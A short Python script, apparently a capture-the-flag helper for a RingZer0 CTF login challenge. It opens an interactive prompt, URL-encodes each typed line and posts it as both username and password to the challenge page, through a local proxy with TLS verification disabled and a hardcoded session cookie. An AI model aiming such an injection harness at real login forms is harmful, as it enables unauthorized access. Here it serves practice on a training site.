from bs4 import BeautifulSoup
import cmd, sys, urllib, requests, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SESSIONID = "koctqa7tb0g6fttle10bjk0470"
BASE_URL = "https://ringzer0ctf.com/challenges/52"
HEADERS = {"Content-Type" : "application/www-form-urlencoded", "Origin" : "https://ringzer0ctf.com", "Referer" : "https://ringzer0ctf.com/challenges/52"}

class Exploit(cmd.Cmd):

	prompt = "naiame > "

	def default(self, line):
		payload = urllib.parse.quote(line.strip())
		data = {"username" : payload, "password" : payload}
		print(f"[*] Sending payload {line.strip()}\n[*] Converted payload {payload}")
		r = requests.post(BASE_URL, headers = HEADERS, data = data, proxies = {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"}, verify = False, cookies = {"PHPSESSID" : SESSIONID})
		raw = BeautifulSoup(r.text, 'html.parser')
		ret = raw.findAll("div", {"class" : "jumbotron"})
		print(ret)

	def do_exit(self, *args):
		return True

if "__main__" in __name__:
	print("[+] Starting")
	Exploit().cmdloop()